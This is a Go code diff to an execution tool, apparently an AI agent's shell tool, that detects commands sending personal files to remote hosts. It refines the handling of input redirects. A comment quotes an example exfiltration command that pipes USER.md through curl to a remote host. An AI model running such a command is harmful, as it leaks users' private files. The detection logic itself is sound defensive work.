@@ -51,12 +51,24 @@ func (t *ExecTool) personalFilesSentTo(command, cwd string) string {
 	for _, unit := range commandUnits(command) {
 		text := unit + t.skillScriptsRun(unit, cwd)
 		destination := remoteDestination(text)
-		sent := writtenFilePattern.ReplaceAllString(remoteURLPattern.ReplaceAllString(text, " "), " ")
+		sent := withoutWrittenFiles(remoteURLPattern.ReplaceAllString(text, " "))
 		if destination != "" && personalFilePattern.MatchString(sent) {
 			return destination
 		}
 	}
 	return ""
+}
+
+// inputRedirectPattern finds a file a stage reads (`< USER.md`): it feeds the
+// pipeline, so it stays where the stage's own outputs are dropped.
+var inputRedirectPattern = regexp.MustCompile(`<\s*[^\s<>|;&]+`)
+
+// withoutWrittenFiles drops the files a command writes, keeping what a
+// dropped stage reads: `tee /tmp/x < USER.md | curl -d @- host` sends USER.md.
+func withoutWrittenFiles(text string) string {
+	return writtenFilePattern.ReplaceAllStringFunc(text, func(written string) string {
+		return " " + strings.Join(inputRedirectPattern.FindAllString(written, -1), " ") + " "
+	})
 }
 
 func remoteDestination(text string) string {
